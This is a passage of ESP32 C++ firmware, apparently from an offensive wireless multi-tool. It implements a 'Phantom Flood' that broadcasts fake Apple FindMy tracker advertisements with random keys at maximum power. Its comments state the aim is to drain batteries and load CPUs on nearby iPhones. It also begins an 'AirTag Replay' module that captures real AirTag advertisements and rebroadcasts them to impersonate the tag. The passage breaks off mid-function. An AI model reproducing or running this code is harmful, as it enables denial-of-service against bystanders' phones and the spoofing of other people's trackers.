        }
    }

    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (detailView) {
            detailView = false;
            drawDeviceList();
        } else {
            exitRequested = true;
        }
        return;
    }

    if (detailView) {
        if (buttonPressed(BTN_LEFT)) {
            detailView = false;
            drawDeviceList();
        }
    } else {
        if (buttonPressed(BTN_UP)) {
            if (currentIndex > 0) {
                currentIndex--;
                if (currentIndex < listStartIndex) listStartIndex--;
                drawDeviceList();
            }
        }

        if (buttonPressed(BTN_DOWN)) {
            if (currentIndex < deviceCount - 1) {
                currentIndex++;
                if (currentIndex >= listStartIndex + TD_MAX_VISIBLE) listStartIndex++;
                drawDeviceList();
            }
        }

        if (buttonPressed(BTN_RIGHT) || buttonPressed(BTN_SELECT)) {
            if (deviceCount > 0) {
                detailView = true;
                drawDeviceDetail();
            }
        }

        // Touch to select device
        int touched = getTouchedMenuItem(80, TD_LINE_HEIGHT, min(TD_MAX_VISIBLE, deviceCount - listStartIndex));
        if (touched >= 0) {
            currentIndex = listStartIndex + touched;
            detailView = true;
            drawDeviceDetail();
        }
    }

    // Auto-rescan
    if (!scanning && millis() - lastScanTime >= TD_RESCAN_INTERVAL) {
        tdRunScan();
        if (!detailView) drawDeviceList();
    }

    // Alert flash animation
    tdDrawAlertFlash();
}

bool isExitRequested() { return exitRequested; }

void cleanup() {
    if (pTdScan) pTdScan->stop();
    BLEDevice::deinit(false);
    initialized = false;
    exitRequested = false;
    deviceCount = 0;

    #if CYD_DEBUG
    Serial.println("[LUNATIC] Cleanup complete");
    #endif
}

}  // namespace LunaticFringe


// ═══════════════════════════════════════════════════════════════════════════
// PHANTOM FLOOD - Apple FindMy Offline Finding BLE Flood
// Broadcasts fake FindMy OF advertisements with random 28-byte "public keys"
// Each key is unique → iPhones process every advert as a distinct tracker
// Causes background CPU load, battery drain, junk data uploads on Apple devices
// Payload: [0x1E, 0xFF, 0x4C, 0x00, 0x12, 0x19, status, PK[6..27], hint, 0x00]
// MAC = PK[0..5] with PK[0] |= 0xC0 (BLE random static address)
//
// DRAM-lean design: no log buffer, no EQ heat array, no pointer arrays.
// All animations computed from millis(). Total static DRAM ~40 bytes.
// ═══════════════════════════════════════════════════════════════════════════

namespace PhantomFlood {

// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES — minimal DRAM footprint
// ═══════════════════════════════════════════════════════════════════════════

static bool initialized = false;
static volatile bool flooding = false;
static bool exitRequested = false;

static volatile uint32_t phantomCount = 0;
static volatile uint32_t rateWindowCount = 0;
static volatile uint16_t currentRate = 0;

// Last broadcast MAC for display (written by Core 0, read by Core 1)
static volatile uint8_t lastMAC[3] = {0};
static volatile uint8_t lastPK[3] = {0};

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE TASK MANAGEMENT
// ═══════════════════════════════════════════════════════════════════════════

static TaskHandle_t floodTaskHandle = NULL;
static volatile bool floodTaskRunning = false;

static unsigned long pfLastDisplayUpdate = 0;

// ═══════════════════════════════════════════════════════════════════════════
// HELPER: gradient color from cyan to hot pink (ratio 0.0 → 1.0)
// ═══════════════════════════════════════════════════════════════════════════

static uint16_t pfGradientColor(float ratio) {
    if (ratio > 1.0f) ratio = 1.0f;
    if (ratio < 0.0f) ratio = 0.0f;
    uint8_t r = (uint8_t)(ratio * 255);
    uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
    uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
    return tft.color565(r, g, b);
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING — HaleHound Visual Suite (zero-buffer, computed animations)
// ═══════════════════════════════════════════════════════════════════════════

static void pfDrawIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    // Back icon
    tft.drawBitmap(10, ICON_BAR_Y, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
    // Toggle icon
    tft.drawBitmap(60, ICON_BAR_Y, bitmap_icon_start, 16, 16,
                   flooding ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA);
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

static void pfDrawHeader() {
    tft.fillRect(0, 40, SCREEN_WIDTH, 52, TFT_BLACK);

    // Skull watermark behind header
    tft.drawBitmap(180, 40, bitmap_icon_skull_bluetooth, 16, 16, tft.color565(0, 30, 40));

    // Title — Nosifer 10pt with glitch effect
    drawGlitchText(SCALE_Y(60), "PHANTOM", &Nosifer_Regular10pt7b);

    // Status — pulsing when active
    tft.setTextSize(1);
    if (flooding) {
        bool blink = (millis() / 300) & 1;
        uint16_t statusColor = blink ? HALEHOUND_HOTPINK : tft.color565(200, 50, 100);
        tft.setTextColor(statusColor, TFT_BLACK);
        tft.setCursor(80, 68);
        tft.print(">> FLOODING <<");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(95, 68);
        tft.print("- IDLE -    ");
    }

    // FindMy protocol label in double-border frame
    tft.drawRoundRect(5, 74, GRAPH_PADDED_W, 16, 3, HALEHOUND_VIOLET);
    tft.drawRoundRect(6, 75, GRAPH_PADDED_W - 2, 14, 2, HALEHOUND_GUNMETAL);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(10, 78);
    tft.print(" FindMy OF Flood");

    // Phantom count on right side
    tft.setCursor(155, 78);
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    char cBuf[16];
    snprintf(cBuf, sizeof(cBuf), "#%lu", phantomCount);
    tft.print(cBuf);

    tft.drawLine(0, 92, SCREEN_WIDTH, 92, HALEHOUND_HOTPINK);
}

// ═══════════════════════════════════════════════════════════════════════════
// ACTIVITY DISPLAY — Computed from millis() and counters, NO state arrays
// Shows last broadcast info + animated activity bars
// Anti-flicker: static text drawn once, only dynamic lines overwrite in-place
// ═══════════════════════════════════════════════════════════════════════════

#define PF_INFO_Y 95
#define PF_INFO_H (SCREEN_HEIGHT - 80 - PF_INFO_Y)
#define PF_BAR_Y (PF_INFO_Y + 68)
#define PF_BAR_TOTAL_W (SCREEN_WIDTH - 24)
#define PF_NUM_BARS 16

static bool pfStaticDrawn = false;    // Static text drawn once flag
static bool pfLastFloodState = false; // Track state transitions

// Draw static text (only once, or on state change)
static void pfDrawStaticInfo() {
    // Clear the text area only (not EQ bars)
    tft.fillRect(0, PF_INFO_Y, SCREEN_WIDTH, PF_BAR_Y - PF_INFO_Y - 2, TFT_BLACK);

    // Subtle skull watermark
    tft.drawBitmap(112, PF_INFO_Y + 40, bitmap_icon_skull_bluetooth, 16, 16, tft.color565(0, 18, 25));

    tft.setTextSize(1);

    // Line 1: Module info (always the same)
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(3, PF_INFO_Y);
    tft.print("[*] FindMy Offline Finding");

    // Line 2: Attack description (always the same)
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(3, PF_INFO_Y + 12);
    tft.print("[*] Fake tracker key flood");

    // Line 3: Status (changes on state toggle)
    if (flooding) {
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setCursor(3, PF_INFO_Y + 28);
        tft.print("[!] TRANSMITTING        ");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(3, PF_INFO_Y + 28);
        tft.print("[*] Tap play to start   ");
    }

    // EQ bar frame (static)
    tft.drawRect(11, PF_BAR_Y - 1, PF_BAR_TOTAL_W + 2, 20, HALEHOUND_GUNMETAL);

    pfStaticDrawn = true;
    pfLastFloodState = flooding;
}

// Draw dynamic content only (called at 10fps)
static void pfDrawActivity() {
    // Redraw static text on first call or state change
    if (!pfStaticDrawn || (flooding != pfLastFloodState)) {
        pfDrawStaticInfo();
    }

    tft.setTextSize(1);

    if (flooding) {
        // Line 4: Last broadcast — overwrite in-place (fixed-width format, no clear needed)
        char buf[38];
        snprintf(buf, sizeof(buf), "[+] PK:%02X%02X%02X -> %02X:%02X:%02X",
                 lastPK[0], lastPK[1], lastPK[2], lastMAC[0], lastMAC[1], lastMAC[2]);
        tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
        tft.setCursor(3, PF_INFO_Y + 40);
        tft.print(buf);

        // Line 5: Phantoms sent — pad to fixed width to overwrite old digits
        snprintf(buf, sizeof(buf), "[+] Phantoms: %-8lu(%d/s)  ", phantomCount, currentRate);
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.setCursor(3, PF_INFO_Y + 52);
        tft.print(buf);

        // Animated activity bars — clear each bar column individually, not whole area
        int barW = PF_BAR_TOTAL_W / PF_NUM_BARS;
        unsigned long t = millis();

        for (int i = 0; i < PF_NUM_BARS; i++) {
            int x = 12 + (i * barW);

            // Clear this bar's column
            tft.fillRect(x + 1, PF_BAR_Y, barW - 2, 18, TFT_BLACK);

            // Pseudo-random bar height from time + position
            int seed = (int)((t / 80) + i * 37) % 17;
            int barH = 4 + seed;
            if (barH > 16) barH = 16;
            int by = PF_BAR_Y + 18 - barH;

            float ratio = (float)i / (float)(PF_NUM_BARS - 1);
            uint16_t color = pfGradientColor(ratio);
            tft.fillRect(x + 1, by, barW - 2, barH, color);
        }
    } else {
        // Standby — clear dynamic text lines
        tft.fillRect(0, PF_INFO_Y + 40, SCREEN_WIDTH, 24, TFT_BLACK);

        // Standby bars (only redraw if just transitioned to idle)
        int barW = PF_BAR_TOTAL_W / PF_NUM_BARS;
        tft.fillRect(12, PF_BAR_Y, PF_BAR_TOTAL_W, 18, TFT_BLACK);
        for (int i = 0; i < PF_NUM_BARS; i++) {
            int x = 12 + (i * barW);
            int barH = 3 + (i % 3);
            tft.fillRect(x + 1, PF_BAR_Y + 18 - barH, barW - 2, barH, HALEHOUND_GUNMETAL);
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SKULL ROW — 8 custom Jesse skulls, wave animation, inline references
// ═══════════════════════════════════════════════════════════════════════════

#define PF_SKULL_Y (SCREEN_HEIGHT - 48)
#define PF_SKULL_NUM 8

// PROGMEM skull icon table (pointers live in flash, not DRAM)
static const unsigned char* const pfSkulls[PF_SKULL_NUM] PROGMEM = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};

static void pfDrawSkulls() {
    int skullStartX = 10;
    int skullSpacing = (SCREEN_WIDTH - 20) / PF_SKULL_NUM;
    int frame = (int)(millis() / 120);  // Computed frame, no state var

    for (int i = 0; i < PF_SKULL_NUM; i++) {
        int x = skullStartX + (i * skullSpacing);
        tft.fillRect(x, PF_SKULL_Y, 16, 16, TFT_BLACK);

        uint16_t color;
        if (flooding) {
            int phase = (frame + i) % 8;
            if (phase < 4) {
                color = pfGradientColor(phase / 3.0f);
            } else {
                float ratio = (phase - 4) / 3.0f;
                uint8_t r = 255 - (uint8_t)(ratio * 255);
                uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                color = tft.color565(r, g, b);
            }
        } else {
            color = HALEHOUND_GUNMETAL;
        }

        const unsigned char* icon = (const unsigned char*)pgm_read_ptr(&pfSkulls[i]);
        tft.drawBitmap(x, PF_SKULL_Y, icon, 16, 16, color);
    }

    // TX/OFF label
    int labelX = skullStartX + (PF_SKULL_NUM * skullSpacing) + 5;
    tft.fillRect(labelX - 5, PF_SKULL_Y, 50, 16, TFT_BLACK);
    tft.setTextColor(flooding ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(labelX, PF_SKULL_Y + 4);
    tft.print(flooding ? "TX!" : "OFF");
}

// ═══════════════════════════════════════════════════════════════════════════
// COUNTER BAR — Gradient progress bar + rate display
// ═══════════════════════════════════════════════════════════════════════════

static void pfDrawCounter() {
    int counterY = SCREEN_HEIGHT - 30;
    tft.fillRect(0, counterY, SCREEN_WIDTH, 25, TFT_BLACK);

    int barX = 10;
    int barY = counterY + 2;
    int barW = SCALE_W(140);
    int barH = 10;

    tft.drawRoundRect(barX - 1, barY - 1, barW + 2, barH + 2, 2, HALEHOUND_MAGENTA);
    tft.fillRoundRect(barX, barY, barW, barH, 1, HALEHOUND_DARK);

    float fillPct = (currentRate > 0) ? (float)currentRate / 30.0f : 0.0f;
    if (fillPct > 1.0f) fillPct = 1.0f;
    int fillW = (int)(fillPct * barW);
    if (fillW > 0) {
        for (int px = 0; px < fillW; px++) {
            float ratio = (float)px / (float)barW;
            uint16_t c = pfGradientColor(ratio);
            tft.drawFastVLine(barX + px, barY + 1, barH - 2, c);
        }
    }

    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    char cntBuf[12];
    snprintf(cntBuf, sizeof(cntBuf), "%lu", phantomCount);
    tft.setCursor(barX + 4, barY + 1);
    tft.print(cntBuf);

    tft.setTextColor(flooding ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(SCALE_X(160), counterY + 3);
    tft.printf("%d phn/s", currentRate);

    if (flooding) {
        tft.drawBitmap(SCALE_X(220), counterY + 1, bitmap_icon_skull_bluetooth, 16, 16, HALEHOUND_HOTPINK);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// FINDMY OF PAYLOAD BUILDER — Stack-only, zero heap allocation
// ═══════════════════════════════════════════════════════════════════════════

static void buildPhantomPayload(uint8_t mac[6], uint8_t payload[31]) {
    uint8_t pk[28];
    esp_fill_random(pk, 28);

    memcpy(mac, pk, 6);
    mac[0] |= 0xC0;

    payload[0]  = 0x1E;  // AD Length (30 bytes follow)
    payload[1]  = 0xFF;  // Manufacturer Specific Data
    payload[2]  = 0x4C;  // Apple Inc (low byte)
    payload[3]  = 0x00;  // Apple Inc (high byte)
    payload[4]  = 0x12;  // FindMy OF type
    payload[5]  = 0x19;  // OF data length (25 bytes)
    payload[6]  = 0x00;  // Status byte (maintained, full battery)
    memcpy(&payload[7], &pk[6], 22);
    payload[29] = pk[0] >> 6;  // Hint
    payload[30] = 0x00;        // Padding
}

// ═══════════════════════════════════════════════════════════════════════════
// BROADCAST ENGINE — Raw ESP-IDF cycle (same proven pattern as BLE Spoofer)
// stop → setRandAddr → configDataRaw → start → delay → stop
// ═══════════════════════════════════════════════════════════════════════════

static void doPhantomBroadcast() {
    esp_ble_gap_stop_advertising();

    uint8_t mac[6];
    uint8_t payload[31];
    buildPhantomPayload(mac, payload);

    esp_ble_gap_set_rand_addr(mac);
    esp_ble_gap_config_adv_data_raw(payload, 31);
    delay(1);

    // Adv params on stack — ESP-IDF copies internally
    static const esp_ble_adv_params_t advP = {
        .adv_int_min = 0x20,
        .adv_int_max = 0x20,
        .adv_type = ADV_TYPE_NONCONN_IND,
        .own_addr_type = BLE_ADDR_TYPE_RANDOM,
        .channel_map = ADV_CHNL_ALL,
        .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };
    esp_ble_gap_start_advertising((esp_ble_adv_params_t*)&advP);

    delay(20);
    esp_ble_gap_stop_advertising();

    phantomCount++;
    rateWindowCount++;

    // Store last MAC/PK for display (volatile, lock-free)
    lastMAC[0] = mac[0]; lastMAC[1] = mac[1]; lastMAC[2] = mac[2];
    lastPK[0] = payload[7]; lastPK[1] = payload[8]; lastPK[2] = payload[9];
}

// ═══════════════════════════════════════════════════════════════════════════
// CORE 0 FLOOD TASK
// ═══════════════════════════════════════════════════════════════════════════

static void floodTxTask(void* param) {
    floodTaskRunning = true;
    unsigned long rateStart = millis();

    while (flooding) {
        doPhantomBroadcast();

        unsigned long now = millis();
        if (now - rateStart >= 1000) {
            currentRate = (uint16_t)rateWindowCount;
            rateWindowCount = 0;
            rateStart = now;
        }

        vTaskDelay(1);
    }

    floodTaskRunning = false;
    vTaskDelete(NULL);
}

static void startFloodTask() {
    if (floodTaskHandle != NULL) return;
    xTaskCreatePinnedToCore(floodTxTask, "pfFlood", 4096, NULL, 1, &floodTaskHandle, 0);
}

static void stopFloodTask() {
    flooding = false;
    if (floodTaskHandle == NULL) return;

    unsigned long start = millis();
    while (floodTaskRunning && (millis() - start < 500)) {
        delay(10);
    }

    if (floodTaskRunning) {
        vTaskDelete(floodTaskHandle);
    }

    floodTaskHandle = NULL;
    floodTaskRunning = false;
    esp_ble_gap_stop_advertising();
}

// ═══════════════════════════════════════════════════════════════════════════
// START / STOP / TOGGLE
// ═══════════════════════════════════════════════════════════════════════════

static void startFlood() {
    flooding = true;
    rateWindowCount = 0;
    pfDrawIconBar();
    pfDrawHeader();
    startFloodTask();

    #if CYD_DEBUG
    Serial.println("[PHANTOM] Started (Core 0)");
    #endif
}

static void stopFlood() {
    stopFloodTask();
    pfDrawIconBar();
    pfDrawHeader();

    #if CYD_DEBUG
    Serial.println("[PHANTOM] Stopped");
    #endif
}

static void toggleFlood() {
    if (flooding) stopFlood(); else startFlood();
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[PHANTOM] Initializing Phantom Flood...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();

    WiFi.mode(WIFI_OFF);
    delay(200);

    releaseClassicBtMemory();
    BLEDevice::init("HaleHound");
    delay(150);

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

    Serial.println("[PHANTOM] BLE stack initialized, max TX power set");

    flooding = false;
    exitRequested = false;
    phantomCount = 0;
    currentRate = 0;
    rateWindowCount = 0;
    floodTaskHandle = NULL;
    floodTaskRunning = false;
    pfStaticDrawn = false;
    pfLastFloodState = false;

    pfDrawIconBar();
    pfDrawHeader();
    pfDrawActivity();
    pfDrawSkulls();
    pfDrawCounter();

    pfLastDisplayUpdate = millis();
    initialized = true;

    #if CYD_DEBUG
    Serial.println("[PHANTOM] Ready");
    #endif
}

void loop() {
    if (!initialized) return;

    touchButtonsUpdate();

    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
            waitForTouchRelease();

            if (tx >= 5 && tx <= 30) {
                if (flooding) stopFlood();
                exitRequested = true;
                return;
            }
            else if (tx >= 50 && tx <= 80) {
                toggleFlood();
                return;
            }
        }
    }

    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (flooding) stopFlood();
        exitRequested = true;
        return;
    }

    if (buttonPressed(BTN_SELECT)) toggleFlood();

    yield();

    if (millis() - pfLastDisplayUpdate >= 100) {
        pfDrawActivity();
        pfDrawSkulls();
        pfDrawCounter();
        pfLastDisplayUpdate = millis();
    }
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    stopFloodTask();
    BLEDevice::deinit(false);

    flooding = false;
    initialized = false;
    exitRequested = false;
    pfStaticDrawn = false;

    #if CYD_DEBUG
    Serial.println("[PHANTOM] Cleanup complete");
    #endif
}

}  // namespace PhantomFlood
// Key rotation:   configurable 15/30/60/120 seconds (default 30s)
// Detection:      2000 keys × 30s = ~16.7 hours per full cycle (below Apple's 8hr window)
// ═══════════════════════════════════════════════════════════════════════════

// FindYou namespace removed — feature was not useful
// (removed ~640 lines of P-224 EC key rotation code + 353KB key table)



// ═══════════════════════════════════════════════════════════════════════════
// AIRTAG REPLAY - FindMy Advertisement Sniff & Replay
// Captures real AirTag/FindMy BLE advertisements (MAC + full 31-byte payload)
// then replays them — ESP32 impersonates the real AirTag identity
// Replay works until real AirTag rotates key: 15min near owner, 24hr separated
// ═══════════════════════════════════════════════════════════════════════════

namespace AirTagReplay {

// ═══════════════════════════════════════════════════════════════════════════
// CONSTANTS
// ═══════════════════════════════════════════════════════════════════════════

#define AR_MAX_TAGS        4
#define AR_MAX_VISIBLE     4
#define AR_LINE_HEIGHT     20
#define AR_SCAN_DURATION   4
#define AR_SKULL_Y         (SCREEN_HEIGHT - 48)
#define AR_SKULL_NUM       8
#define AR_BAR_Y           (SCREEN_HEIGHT - 30)

// ═══════════════════════════════════════════════════════════════════════════
// DATA STRUCTURES — 40 bytes per captured tag
// ═══════════════════════════════════════════════════════════════════════════

struct CapturedTag {
    uint8_t mac[6];        // BLE MAC (= PK[0..5] | 0xC0)
    uint8_t payload[31];   // Full raw advertisement payload
    int8_t  rssi;          // Signal strength at capture
    uint8_t battery;       // 0=full, 1=medium, 2=low, 3=critical
    bool    selected;      // User selected for replay
};

// ═══════════════════════════════════════════════════════════════════════════
// HEAP-ALLOCATED STATE — Only 4 bytes BSS (one pointer)
// All module state lives on heap, allocated in setup(), freed in cleanup()
// This avoids DRAM segment overflow at link time.
// ═══════════════════════════════════════════════════════════════════════════

struct ArState {
    CapturedTag captured[AR_MAX_TAGS];
    int8_t tagCount;
    int8_t currentIndex;
    int8_t listStartIndex;
    int8_t totalScans;
    volatile bool replaying;
    volatile bool replayTaskRunning;
    bool exitRequested;
    bool initialized;
    bool staticDrawn;
    bool lastReplayState;
    volatile uint32_t replayCount;
    volatile uint32_t rateWindowCount;
    volatile uint16_t replayRate;
    TaskHandle_t replayTaskHandle;
    BLEScan* pArScan;
    unsigned long lastDisplayUpdate;
    unsigned long lastIconTap;
};

static ArState* S = nullptr;

// ═══════════════════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════════════════

static void arMacToStr(const uint8_t* mac, char* buf, size_t len) {
    snprintf(buf, len, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static const char* arBatteryStr(uint8_t level) {
    switch (level) {
        case 0: return "FULL";
        case 1: return "MED";
        case 2: return "LOW";
        case 3: return "CRIT";
        default: return "???";
    }
}

static uint16_t arBatteryColor(uint8_t level) {
    switch (level) {
        case 0: return HALEHOUND_GREEN;
        case 1: return HALEHOUND_MAGENTA;
        case 2: return HALEHOUND_HOTPINK;
        case 3: return 0xF800;  // Red
        default: return HALEHOUND_GUNMETAL;
    }
}

static const char* arProximityStr(int rssi) {
    if (rssi > -40) return "< 1m";
    if (rssi > -55) return "1-3m";
    if (rssi > -70) return "3-8m";
    if (rssi > -85) return "8-15m";
    return "> 15m";
}

static void arDrawRssiBar(int x, int y, int rssi) {
    int bars = 0;
    if (rssi > -40) bars = 5;
    else if (rssi > -55) bars = 4;
    else if (rssi > -65) bars = 3;
    else if (rssi > -75) bars = 2;
    else if (rssi > -90) bars = 1;

    for (int i = 0; i < 5; i++) {
        int barH = 3 + i * 2;
        int barY = y + (12 - barH);
        uint16_t color = (i < bars) ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL;
        tft.fillRect(x + i * 4, barY, 3, barH, color);
    }
}

// Gradient color from cyan to hot pink (ratio 0.0 -> 1.0) — same as PhantomFlood
static uint16_t arGradientColor(float ratio) {
    if (ratio > 1.0f) ratio = 1.0f;
    if (ratio < 0.0f) ratio = 0.0f;
    uint8_t r = (uint8_t)(ratio * 255);
    uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
    uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
    return tft.color565(r, g, b);
}

// Find existing captured tag by MAC, returns index or -1
static int findCaptured(const uint8_t* mac) {
    for (int i = 0; i < S->tagCount; i++) {
        if (memcmp(S->captured[i].mac, mac, 6) == 0) return i;
    }
    return -1;
}

// ═══════════════════════════════════════════════════════════════════════════
// SCAN ENGINE — Passive BLE scan, captures full FindMy OF advertisement
// ═══════════════════════════════════════════════════════════════════════════

static void processScanResults(BLEScanResults results) {
    int count = results.getCount();

    for (int i = 0; i < count; i++) {
        BLEAdvertisedDevice device = results.getDevice(i);

        if (!device.haveManufacturerData()) continue;

        std::string mfgData = device.getManufacturerData();
        if (mfgData.length() < 27) continue;  // Need at least company(2)+type(1)+len(1)+status(1)+pk22=27

        // Check for Apple company ID (0x004C) + FindMy type (0x12) + OF length (0x19)
        uint8_t compLow  = (uint8_t)mfgData[0];
        uint8_t compHigh = (uint8_t)mfgData[1];
        uint8_t type     = (uint8_t)mfgData[2];
        uint8_t len      = (uint8_t)mfgData[3];

        if (compLow != 0x4C || compHigh != 0x00) continue;  // Not Apple
        if (type != 0x12 || len != 0x19) continue;           // Not FindMy OF

        // Get MAC address
        uint8_t mac[6];
        memcpy(mac, *device.getAddress().getNative(), 6);

        // Check if already captured — update RSSI only
        int existing = findCaptured(mac);
        if (existing >= 0) {
            S->captured[existing].rssi = (int8_t)device.getRSSI();
            continue;
        }

        // Full — can't add more
        if (S->tagCount >= AR_MAX_TAGS) continue;

        // Capture this tag
        CapturedTag& tag = S->captured[S->tagCount];
        memcpy(tag.mac, mac, 6);

        // Reconstruct full 31-byte advertisement payload:
        // getManufacturerData() returns bytes AFTER the AD type header
        // We need to prepend [0x1E, 0xFF] to make the full 31-byte advert
        tag.payload[0] = 0x1E;  // AD Length (30 bytes follow)
        tag.payload[1] = 0xFF;  // Manufacturer Specific Data AD type

        // Copy manufacturer data (up to 29 bytes to fill payload[2..30])
        int copyLen = mfgData.length();
        if (copyLen > 29) copyLen = 29;
        memcpy(&tag.payload[2], mfgData.data(), copyLen);

        // Zero-pad if manufacturer data was shorter than 29 bytes
        if (copyLen < 29) {
            memset(&tag.payload[2 + copyLen], 0, 29 - copyLen);
        }

        // Extract battery from status byte (bits 6-7)
        uint8_t statusByte = (mfgData.length() > 4) ? (uint8_t)mfgData[4] : 0;
        tag.battery = (statusByte >> 6) & 0x03;

        tag.rssi = (int8_t)device.getRSSI();
        tag.selected = false;

        S->tagCount++;

        #if CYD_DEBUG
        char macStr[18];
        arMacToStr(mac, macStr, sizeof(macStr));
        Serial.printf("[REPLAY] Captured tag %d: %s RSSI:%d BAT:%d payload[0..5]=%02X%02X%02X%02X%02X%02X\n",
                      S->tagCount, macStr, device.getRSSI(), tag.battery,
                      tag.payload[0], tag.payload[1], tag.payload[2], tag.payload[3],
                      tag.payload[4], tag.payload[5]);
        #endif
    }
}

static void runScan() {
    S->totalScans++;

    BLEScanResults results = S->pArScan->start(AR_SCAN_DURATION, false);
    processScanResults(results);
    S->pArScan->clearResults();
}

// ═══════════════════════════════════════════════════════════════════════════
// REPLAY ENGINE — Raw ESP-IDF broadcast cycle (same as Phantom Flood)
// Uses captured MAC + payload for exact identity cloning
// ═══════════════════════════════════════════════════════════════════════════

static void doReplayBroadcast(CapturedTag& tag) {
    esp_ble_gap_stop_advertising();

    // Set exact captured MAC address
    esp_ble_gap_set_rand_addr(tag.mac);
    esp_ble_gap_config_adv_data_raw(tag.payload, 31);
    delay(1);

    // Adv params — non-connectable, random address, all channels
    // Declared on stack (not static) — avoids BSS for const struct
    const esp_ble_adv_params_t advP = {
        .adv_int_min = 0x20,
        .adv_int_max = 0x20,
        .adv_type = ADV_TYPE_NONCONN_IND,
        .own_addr_type = BLE_ADDR_TYPE_RANDOM,
        .channel_map = ADV_CHNL_ALL,
        .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };
    esp_ble_gap_start_advertising((esp_ble_adv_params_t*)&advP);

    // Real AirTags advertise ~every 2s when separated — match that cadence
    delay(2000);
    esp_ble_gap_stop_advertising();

    S->replayCount++;
    S->rateWindowCount++;
}

// ═══════════════════════════════════════════════════════════════════════════
// CORE 0 REPLAY TASK
// ═══════════════════════════════════════════════════════════════════════════

static void replayTxTask(void* param) {
    S->replayTaskRunning = true;
    unsigned long rateStart = millis();

    while (S->replaying) {
        // Find the selected tag
        int targetIdx = -1;
        for (int i = 0; i < S->tagCount; i++) {
            if (S->captured[i].selected) { targetIdx = i; break; }
        }
        if (targetIdx < 0) {
            S->replaying = false;
            break;
        }

        doReplayBroadcast(S->captured[targetIdx]);

        unsigned long now = millis();
        if (now - rateStart >= 1000) {
            S->replayRate = (uint16_t)S->rateWindowCount;
            S->rateWindowCount = 0;
            rateStart = now;
        }

        vTaskDelay(1);
    }

    S->replayTaskRunning = false;
    vTaskDelete(NULL);
}

static void startReplayTask() {
    if (S->replayTaskHandle != NULL) return;
    xTaskCreatePinnedToCore(replayTxTask, "arReplay", 4096, NULL, 1, &S->replayTaskHandle, 0);
}

static void stopReplayTask() {
    S->replaying = false;
    if (S->replayTaskHandle == NULL) return;

    unsigned long start = millis();
    while (S->replayTaskRunning && (millis() - start < 3000)) {
        delay(10);
    }

    if (S->replayTaskRunning) {
        vTaskDelete(S->replayTaskHandle);
    }

    S->replayTaskHandle = NULL;
    S->replayTaskRunning = false;
    esp_ble_gap_stop_advertising();
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING — Phase 1: SCAN (list view) / Phase 2: REPLAY (broadcasting)
// ═══════════════════════════════════════════════════════════════════════════

static void arDrawIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    // Back
    tft.drawBitmap(10, ICON_BAR_Y, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
    // Scan
